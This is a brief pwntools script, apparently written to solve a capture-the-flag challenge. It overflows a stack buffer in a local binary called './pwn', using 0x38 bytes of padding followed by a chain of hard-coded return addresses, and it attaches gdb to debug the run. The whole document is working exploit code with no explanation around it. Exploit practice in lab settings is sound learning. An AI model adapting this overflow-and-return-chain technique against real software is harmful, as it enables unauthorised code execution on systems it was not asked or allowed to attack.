from pwn import*

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]

p=process('./pwn')
def debug():
    gdb.attach(p)
payload=b'a'*0x38+p64(0X401343)+p64(0x4010D4)+p64(0x4010D4)+p64(0x4010D4)+p64(0x4010D4)+p64(0x4010D4)
#debug()
gdb.attach(p,'b* 0x401482')
p.send(payload)
p.interactive()